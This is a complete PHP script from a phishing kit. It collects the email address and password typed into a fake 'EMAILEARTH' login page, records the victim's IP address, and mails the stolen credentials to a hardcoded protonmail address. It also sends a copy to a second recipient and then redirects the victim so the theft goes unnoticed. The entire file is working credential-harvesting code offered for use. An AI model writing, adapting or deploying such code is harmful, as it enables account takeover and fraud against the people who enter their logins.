<?php

include '../blocker.php';
$ip = getenv("REMOTE_ADDR");
$message  = "------------------+EMAILEARTH LOGIN +-----------------\n";
$message .= "Email Address: ".$_POST['1']."\n";
$message .= "Password: ".$_POST['2']."\n";
$message .= "-------------------------------------------------\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$message .= "-------------------+ Created in 2020 [ Donflow ] +--------------------\n";

$recipient = "oztheplug@protonmail.com";
$subject = "EARTHEMAIL LOGIN RESULTZ";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."n";
$headers .= "Donflow-LOGIN";
     mail("$cc", "yahoo Info", $message);
if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: _+ak+_=.html");

       }
else
           {
        echo "ERROR! Please go back and try again.";
         }

?>
        